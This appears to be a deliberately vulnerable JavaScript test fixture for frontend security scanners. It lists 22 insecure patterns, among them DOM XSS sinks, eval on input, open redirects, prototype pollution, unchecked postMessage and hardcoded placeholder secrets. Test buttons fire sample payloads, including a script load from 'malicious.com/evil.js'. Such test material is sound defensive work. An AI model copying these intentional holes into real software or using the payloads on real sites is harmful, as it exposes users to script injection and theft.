// Vulnerable JavaScript file for frontend security testing

// 1. DOM XSS vulnerabilities
function updateContent(userInput) {
    document.getElementById('content').innerHTML = userInput;
}

function replaceElement(userInput) {
    const element = document.getElementById('target');
    element.outerHTML = userInput;
}

// 2. Code injection vulnerabilities
function executeUserCode(code) {
    eval(code);
}

function createDynamicFunction(userCode) {
    const func = new Function(userCode);
    func();
}

// 3. Open redirect vulnerabilities
function redirectUser(url) {
    window.location.href = url;
}

function openNewWindow(url) {
    window.open(url);
}

// 4. Prototype pollution
function mergeObjects(target, source) {
    for (let key in source) {
        if (key === '__proto__') {
            target.__proto__ = source[key];
        } else {
            target[key] = source[key];
        }
    }
}

// 5. Insecure HTTP requests
async function fetchData(endpoint) {
    const response = await fetch('http://api.example.com/' + endpoint);
    return response.json();
}

// 6. Dynamic script loading
function loadScript(scriptUrl) {
    const script = document.createElement('script');
    script.src = scriptUrl;
    document.head.appendChild(script);
}

// 7. Timing attacks with user input
function scheduleExecution(code) {
    setTimeout(code, 1000);
}

function repeatExecution(code) {
    setInterval(code, 5000);
}

// 8. Document manipulation
function writeToDocument(content) {
    document.write(content);
}

function insertHTML(content) {
    const container = document.getElementById('container');
    container.insertAdjacentHTML('beforeend', content);
}

// 9. Regular expression DoS
function testPattern(pattern, text) {
    const regex = new RegExp(pattern);
    return regex.test(text);
}

// 10. Unsafe storage of sensitive data
function storeCredentials(token, apiKey) {
    localStorage.setItem('authToken', token);
    sessionStorage.setItem('apiKey', apiKey);
}

// 11. Hardcoded secrets
const API_SECRET = 'sk-1234567890abcdef1234567890abcdef';
const JWT_SECRET = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ';

// 12. Cross-origin messaging without validation
function sendMessage(data) {
    window.postMessage(data, '*');
}

// 13. Event handlers without origin checks
window.addEventListener('message', function(event) {
    // No origin validation - vulnerable
    document.getElementById('output').innerHTML = event.data;
});

// 14. Dynamic import with user input
async function loadModule(modulePath) {
    const module = await import(modulePath);
    return module;
}

// 15. Location manipulation
function updateHash(value) {
    window.location.hash = value;
}

function updateSearch(params) {
    window.location.search = params;
}

// 16. Mixed content loading
function loadInsecureImage(imageUrl) {
    const img = new Image();
    img.src = 'http://insecure.example.com/' + imageUrl;
    document.body.appendChild(img);
}

// 17. WebSocket without proper validation
function connectWebSocket(url) {
    const ws = new WebSocket('ws://insecure.example.com/' + url);
    ws.onmessage = function(event) {
        document.getElementById('messages').innerHTML += event.data;
    };
}

// 18. Cookie manipulation without security flags
function setCookie(name, value) {
    document.cookie = name + '=' + value;
}

// 19. Form action manipulation
function updateFormAction(action) {
    document.getElementById('form').action = action;
}

// 20. Iframe source manipulation
function loadIframe(src) {
    const iframe = document.createElement('iframe');
    iframe.src = src;
    document.body.appendChild(iframe);
}

// 21. Worker with user input
function createWorker(workerScript) {
    const worker = new Worker(workerScript);
    worker.postMessage('start');
}

// 22. History manipulation
function updateHistory(url) {
    history.pushState({}, '', url);
}

// Event listeners for testing
document.addEventListener('DOMContentLoaded', function() {
    // Setup test buttons
    const buttons = [
        { id: 'test-innerHTML', handler: () => updateContent('<script>alert("XSS")</script>') },
        { id: 'test-eval', handler: () => executeUserCode('alert("Code Injection")') },
        { id: 'test-redirect', handler: () => redirectUser('http://malicious.com') },
        { id: 'test-fetch', handler: () => fetchData('sensitive-data') },
        { id: 'test-script', handler: () => loadScript('http://malicious.com/evil.js') }
    ];

    buttons.forEach(button => {
        const element = document.getElementById(button.id);
        if (element) {
            element.addEventListener('click', button.handler);
        }
    });
});

// Export for module usage
if (typeof module !== 'undefined' && module.exports) {
    module.exports = {
        updateContent,
        executeUserCode,
        redirectUser,
        fetchData,
        loadScript,
        testPattern,
        storeCredentials
    };
} 